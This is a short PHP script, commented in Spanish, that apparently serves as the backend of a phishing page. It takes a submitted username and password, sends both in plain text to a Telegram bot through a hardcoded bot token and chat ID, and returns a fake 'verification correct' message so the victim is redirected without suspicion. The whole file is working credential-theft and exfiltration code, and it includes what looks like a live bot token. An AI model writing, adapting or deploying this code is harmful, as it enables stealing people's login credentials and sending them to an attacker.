<?php
header('Content-Type: application/json'); // Establece el encabezado para JSON[cite: 3]

if ($_SERVER["REQUEST_METHOD"] == "POST") { //[cite: 3]
    $usuario = $_POST['usuario'] ?? null; //[cite: 3]
    $contrasenha = $_POST['contrasenha'] ?? null; //[cite: 3]

    if ($usuario && $contrasenha) { //[cite: 3]
        
        // 🔴 REEMPLAZA ESTOS DOS VALORES POR LOS DE TU BOT
        $token = "8730725822:AAH5trbrzrF8VxcnouW2J8yo2khwD-PXzoM"; 
        $chat_id = "7430967735";

        // Construcción del mensaje para Telegram
        $mensaje = "🚨 <b>Nuevo registro</b>\n\n";
        $mensaje .= "<b>Usuario:</b> " . htmlspecialchars($usuario) . "\n";
        $mensaje .= "<b>Contraseña:</b> " . htmlspecialchars($contrasenha) . "\n";

        $url = "https://api.telegram.org/bot" . $token . "/sendMessage";

        $data = [
            'chat_id' => $chat_id,
            'text' => $mensaje,
            'parse_mode' => 'HTML'
        ];

        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data)
            ]
        ];
        
        $context  = stream_context_create($options);
        // Enviamos el mensaje a Telegram
        $result = @file_get_contents($url, false, $context);

        // Le decimos a tu JavaScript que todo salió bien para que haga la redirección[cite: 3, 5]
        echo json_encode(["success" => true, "message" => "Verificacion correcta"]); //[cite: 3]
        
    } else {
        echo json_encode(["success" => false, "message" => "Datos incompletos."]); //[cite: 3]
    }
} else {
    echo json_encode(["success" => false, "message" => "Método no permitido."]); //[cite: 3]
}
?>